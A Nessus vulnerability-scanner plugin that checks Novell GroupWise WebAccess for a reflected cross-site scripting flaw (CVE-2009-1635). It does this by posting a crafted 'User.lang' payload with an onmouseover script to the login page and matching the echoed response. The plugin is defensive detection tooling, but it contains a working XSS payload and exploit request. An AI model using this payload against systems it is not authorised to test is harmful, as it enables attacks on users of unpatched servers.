#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(38927);
  script_version("$Revision: 1.12 $");

  script_cve_id("CVE-2009-1635");
  script_bugtraq_id(35061);
  script_osvdb_id(54643);
  script_xref(name:"Secunia", value:"35177");

  script_name(english:"Novell GroupWise WebAccess Login Page User.lang Parameter XSS");
  script_summary(english:"Attempts a non-persistent XSS attack");

  script_set_attribute( attribute:"synopsis", value:
"The web application running on the remote host has a
cross-site scripting vulnerability."  );
  script_set_attribute( attribute:"description", value:
"The remote host is running Novell GroupWise WebAccess, which is
vulnerable to a cross-site scripting issue in the 'User.lang' field
of the login page.

There are other issues known to be associated with this version of
GroupWise WebAccess that Nessus has not tested for. Refer to the
Secunia advisory for details."  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.securityfocus.com/archive/1/503700/30/0/threaded"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.nessus.org/u?cc5f3ba8"
  );
  script_set_attribute(
    attribute:"solution",
    value:"Upgrade to version 7.03 HP3 / 8.0 HP2 or later."
  );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(79);
 script_set_attribute(attribute:"plugin_publication_date", value: "2009/05/27");
 script_cvs_date("$Date: 2015/09/24 21:08:39 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:novell:groupwise_webaccess");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (get_kb_item("www/"+port+"/generic_xss")) exit(0);

exploit = string(
  '" /><div onmouseover="alert(',
  "'", SCRIPT_NAME, "'",
  ')" style="javascript:visibility:visible;">'
);

disable_cookiejar();

foreach dir (make_list("/gw", "/servlet"))
{
  # See if the page exists
  url = string(dir, "/webacc");
  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res)) exit(0);

  # If it does, attempt to exploit
  if (string('action="', url, '"') >< res[2])
  {
    postdata = string("User.lang=", urlencode(str:exploit));
  
    req = http_mk_post_req(
      port        : port,
      item        : url, 
      data        : postdata,
      add_headers : make_array(
        "Content-Type", "application/x-www-form-urlencoded"
      )
    );
    res = http_send_recv_req(port:port, req:req);
    if (isnull(res)) exit(0);
  
    # need to escape the parens in the exploit so they can be used in a regex
    escaped_exploit = str_replace(string:exploit, find:"(", replace:"\(");
    escaped_exploit = str_replace(string:escaped_exploit, find:")", replace:"\)");
    pat = '<a href[^>]+' + escaped_exploit;

    if (
      string('if( sLang != "', exploit, '" )') >< res[2] ||
      egrep(string:res[2], pattern:pat, icase:TRUE)
    )
    {
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
  
      if (report_verbosity > 0)
      {
        req_str = http_mk_buffer_from_req(req:req);
        report = string(
          "\n",
          "Nessus was able to exploit the issue using the following request :\n",
          "\n",
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
          req_str, "\n",
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
        );
        security_warning(port:port, extra:report);
      }
      else security_warning(port);
      exit(0);
    }
  }
}
